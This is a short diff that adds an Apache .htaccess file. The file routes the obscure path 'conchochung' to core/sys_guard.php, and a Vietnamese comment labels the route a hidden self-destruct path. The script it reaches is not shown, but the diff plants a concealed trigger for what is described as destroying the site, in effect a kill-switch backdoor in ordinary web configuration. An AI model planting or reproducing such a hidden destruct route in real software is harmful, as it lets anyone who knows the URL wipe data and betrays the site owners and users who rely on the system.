@@ -1,0 +1,4 @@
+RewriteEngine On
+
+# Đường dẫn tự hủy ngầm
+RewriteRule ^conchochung/?$ core/sys_guard.php [L]
